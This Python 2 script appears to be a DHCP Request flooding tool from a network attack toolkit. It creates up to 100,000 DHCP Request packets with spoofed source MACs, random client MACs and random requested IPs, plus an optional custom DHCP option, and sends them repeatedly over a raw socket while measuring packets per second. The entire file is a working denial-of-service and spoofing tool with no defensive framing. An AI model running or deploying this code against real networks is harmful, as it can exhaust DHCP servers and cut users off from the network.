from base import Base
from argparse import ArgumentParser
from netifaces import ifaddresses, AF_LINK
from network import Ethernet_raw, IP_raw, DHCP_raw
from sys import stdout
from socket import socket, AF_PACKET, SOCK_RAW
from datetime import datetime
from time import time
from random import randint


if __name__ == "__main__":

    Base.check_platform()
    Base.check_user()
    PACKETS = []

    parser = ArgumentParser(description='DHCP Request raw packet sender')
    parser.add_argument('-i', '--interface', type=str, help='Set interface name for send discover packets')
    parser.add_argument('-n', '--notspoofmac', help='Don\'t spoof MAC address', action='store_true')
    parser.add_argument('-p', '--packets', type=int, help='Number of packets (default: 100000)', default=100000)
    parser.add_argument('-k', '--iterations', type=int, help='Number of iterations (default: 100)', default=100)
    parser.add_argument('-r', '--requested_ip', type=str, help='Set requested IP', default=None)
    parser.add_argument('-v', '--dhcp_option_value', type=str, help='Set DHCP option value', default=None)
    parser.add_argument('-c', '--dhcp_option_code', type=int, help='Set DHCP option code (default: 12)', default=12)
    args = parser.parse_args()

    number_of_packets = int(args.packets)
    number_of_iterations = int(args.iterations)

    current_network_interface = ""
    if args.interface is None:
        current_network_interface = Base.netiface_selection()
    else:
        current_network_interface = args.interface

    current_mac_address = ""
    try:
        current_mac_address = str(ifaddresses(current_network_interface)[AF_LINK][0]['addr'])
    except:
        print "This network interface does not have mac address!"
        exit(1)

    count = 0
    count_max = int(args.packets)

    index_percent = 0
    count_percent = 0

    print "Creating packets..."

    if args.notspoofmac:
        print " Your MAC address is not spoofed!"

    eth = Ethernet_raw()
    ip = IP_raw()
    dhcp = DHCP_raw()

    while count < count_max:

        if args.notspoofmac:
            SRC_MAC = current_mac_address
        else:
            SRC_MAC = eth.get_mac_for_dhcp_discover()

        if args.requested_ip is not None:
            REQ_IP = args.requested_ip
        else:
            REQ_IP = ip.get_random_ip()

        current_packet = dhcp.make_request_packet(source_mac=SRC_MAC,
                                                  client_mac=eth.get_random_mac(),
                                                  transaction_id=randint(1, 4294967295),
                                                  dhcp_message_type=3,
                                                  requested_ip=REQ_IP,
                                                  option_value=args.dhcp_option_value,
                                                  option_code=args.dhcp_option_code)
        PACKETS.append(current_packet)

        count += 1
        if count > count_percent:
            stdout.flush()
            stdout.write(" Complete: " + str(index_percent + 1) + "%   \r")
            index_percent += 1
            count_percent = (count_max / 100) * index_percent

    NUMBER_OF_PACKETS = int(args.packets)
    NUMBER_OF_ITERATIONS = int(args.iterations)

    SOCK = socket(AF_PACKET, SOCK_RAW)
    SOCK.bind((current_network_interface, 0))

    print "\r\nSending packets..."
    print "Number of packets:       " + str(args.packets)
    print "Start sending packets:   " + str(datetime.now().strftime("%Y/%m/%d %H:%M:%S"))
    start_time = time()

    for _ in range(NUMBER_OF_ITERATIONS):
        for index in range(NUMBER_OF_PACKETS):
            SOCK.send(PACKETS[index])

    stop_time = time()
    print "All packets sent:        " + str(datetime.now().strftime("%Y/%m/%d %H:%M:%S"))
    SOCK.close()
    delta_time = stop_time - start_time
    speed = (NUMBER_OF_PACKETS * NUMBER_OF_ITERATIONS) / delta_time
    print "Speed:                   " + str(int(speed)) + " pkt/sec\r\n"
